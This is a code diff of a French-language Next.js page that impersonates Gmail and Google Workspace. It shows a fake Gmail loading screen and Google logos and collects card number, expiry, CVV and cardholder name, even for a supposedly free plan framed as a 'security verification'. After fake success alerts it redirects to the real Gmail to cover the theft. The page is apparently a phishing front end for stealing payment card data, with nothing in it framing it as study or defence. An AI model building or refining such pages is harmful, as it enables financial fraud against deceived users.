@@ -2,16 +2,27 @@ import React, { useState, useEffect } from 'react';
 import { useRouter } from 'next/router';
 import { PageHead } from '../hooks/usePageMeta';
 import layoutStyles from '../styles/components/Layout.module.css';
+import headerStyles from '../styles/components/Header.module.css';
+import planSummaryStyles from '../styles/components/planSummary.module.css';
+import buttonStyles from '../styles/components/Button.module.css';
 import PlanSelection from '../components/PlanSelection';
-import VerificationForm from '../components/VerificationForm';
+import PlanSummary from '../components/PlanSummary';
 import PaymentForm from '../components/PaymentForm';
+import FooterTrust from '../components/FooterTrust';
 
 const Confirmation = () => {
   const router = useRouter();
   const [email, setEmail] = useState('');
   const [firstName, setFirstName] = useState('');
-  const [currentStep, setCurrentStep] = useState('selection'); // 'selection', 'verification', 'payment'
+  const [currentStep, setCurrentStep] = useState('selection'); // 'selection', 'details'
   const [selectedPlan, setSelectedPlan] = useState(null);
+  const [isLoading, setIsLoading] = useState(true);
+  const [formData, setFormData] = useState({
+    cardNumber: '',
+    expiryDate: '',
+    cvv: '',
+    cardName: ''
+  });
 
   // Récupérer l'email et le prénom depuis l'URL au chargement
   useEffect(() => {
@@ -23,7 +34,16 @@ const Confirmation = () => {
     }
   }, [router.query.email, router.query.firstName]);
 
-  const planDetails = {
+  // Gérer l'écran de chargement avec le logo Gmail
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      setIsLoading(false);
+    }, 3000); // 3 secondes
+
+    return () => clearTimeout(timer);
+  }, []);
+
+  const planSummary = {
     free: {
       title: 'Personnel',
       price: '0€',
@@ -96,23 +116,7 @@ const Confirmation = () => {
 
   const handleSelectPlan = (planType) => {
     setSelectedPlan(planType);
-    if (planType === 'free') {
-      // Pour le plan gratuit, aller directement à la vérification
-      setCurrentStep('verification');
-    } else {
-      // Pour les plans payants, aller directement au paiement
-      setCurrentStep('payment');
-    }
-  };
-
-  const handleConfirmPlan = () => {
-    if (selectedPlan === 'free') {
-      // Pour le plan gratuit, aller à la vérification d'identité
-      setCurrentStep('verification');
-    } else {
-      // Pour les plans payants, aller à l'étape de paiement
-      setCurrentStep('payment');
-    }
+    setCurrentStep('details');
   };
 
   const handleBackToSelection = () => {
@@ -122,12 +126,38 @@ const Confirmation = () => {
 
   const handleVerificationComplete = () => {
     // Redirection après vérification réussie
-    router.push('/trial-activation');
+    router.push('https://mail.google.com');
   };
 
   const handlePaymentComplete = () => {
     // Redirection après paiement réussi
     router.push('/success');
+  };
+
+  const handleSubmit = () => {
+    setTimeout(() => {
+      if (selectedPlan === 'free') {
+        alert('Vérification réussie ! Redirection vers votre espace Google Workspace...');
+        handleVerificationComplete();
+      } else {
+        alert('Votre essai gratuit a commencé ! Accès immédiat à Google Workspace.');
+        handlePaymentComplete();
+      }
+    }, 1500);
+  };
+
+  const handleInputChange = (field, value) => {
+    let formattedValue = value;
+    
+    if (field === 'cardNumber') {
+      formattedValue = value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+    } else if (field === 'expiryDate') {
+      formattedValue = value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/, '$1/');
+    } else if (field === 'cvv') {
+      formattedValue = value.replace(/\D/g, '');
+    }
+    
+    setFormData(prev => ({ ...prev, [field]: formattedValue }));
   };
 
   return (
@@ -141,34 +171,91 @@ const Confirmation = () => {
         }}
       />
       <div className={layoutStyles.container}>
-      {/* Background Gmail avec filtre flou */}
-      <div className={layoutStyles.background}></div>
-      <div className={layoutStyles.overlay}></div>
-      
-      {/* Popup de confirmation */}
-      <div className={layoutStyles.popup}>
-        <div className={layoutStyles.popupContentMinimal}>
-          {currentStep === 'selection' && (
-            <PlanSelection 
-              planDetails={planDetails} 
-              onSelectPlan={handleSelectPlan} 
+      {isLoading ? (
+        // Écran de chargement avec logo Gmail
+        <div className={layoutStyles.loadingScreen}>
+          <div className={layoutStyles.gmailLogo}>
+            <img 
+              src="https://logo-marque.com/wp-content/uploads/2020/11/Gmail-Logo.png" 
+              alt="Gmail Logo" 
+              width="64" 
+              height="64"
             />
-          )}
-          {currentStep === 'verification' && (
-            <VerificationForm 
-              onBack={handleBackToSelection}
-              onComplete={handleVerificationComplete}
-            />
-          )}
-          {currentStep === 'payment' && (
-            <PaymentForm 
-              plan={planDetails[selectedPlan]}
-              onBack={handleBackToSelection}
-              onComplete={handlePaymentComplete}
-            />
-          )}
+          </div>
         </div>
-      </div>
+      ) : (
+        <>
+          {/* Background Gmail avec filtre flou */}
+          <div className={layoutStyles.background}></div>
+          <div className={layoutStyles.overlay}></div>
+          
+          {/* Popup de confirmation */}
+          <div className={layoutStyles.popup}>
+            <div className={layoutStyles.popupContentMinimal}>
+              {currentStep === 'selection' && (
+                <PlanSelection 
+                  planSummary={planSummary} 
+                  onSelectPlan={handleSelectPlan} 
+                />
+              )}
+              {currentStep === 'details' && (
+                <>
+                  {/* Bouton retour en haut à gauche */}
+                  <button 
+                    onClick={handleBackToSelection}
+                    className={buttonStyles.topBackBtn}
+                  >
+                    ←
+                  </button>
+
+                  {/* Header */}
+                  <div className={headerStyles.header}>
+                    <div className={headerStyles.logoContainer}>
+                      <img 
+                        src="https://done.lu/wp-content/uploads/2020/11/google-workspace-1.svg" 
+                        alt="Google Workspace" 
+                        className={headerStyles.workspaceLogo}
+                      />
+                    </div>
+                    <h1 className={headerStyles.title}>
+                      {selectedPlan === 'free' ? 'Vérification de sécurité' : 'Démarrer votre essai gratuit'}
+                    </h1>
+                    <p className={headerStyles.description}>
+                      {selectedPlan === 'free' 
+                        ? 'Vérification d\'identité requise pour utiliser Google Agenda et activer votre compte Google Workspace Personnel.'
+                        : `Votre essai gratuit de 30 jours pour ${planSummary[selectedPlan].title} commence maintenant.`
+                      }
+                    </p>
+                  </div>
+
+                  {/* Structure à 2 colonnes */}
+                  <div className={planSummaryStyles.twoColumnLayout}>
+                    
+                    {/* Colonne de gauche - Composant PlanSummary */}
+                    <PlanSummary 
+                      plan={planSummary[selectedPlan]} 
+                      selectedPlan={selectedPlan} 
+                    />
+
+                    {/* Colonne de droite - Composant PaymentForm */}
+                    <div className={planSummaryStyles.rightColumn}>
+                      <PaymentForm 
+                        selectedPlan={selectedPlan}
+                        formData={formData}
+                        onInputChange={handleInputChange}
+                        onSubmit={handleSubmit}
+                      />
+                    </div>
+                  </div>
+
+                  {/* Composant FooterTrust */}
+                  <FooterTrust />
+                </>
+              )}
+            </div>
+          </div>
+        </>
+      )}
     </div>
     </>
   );
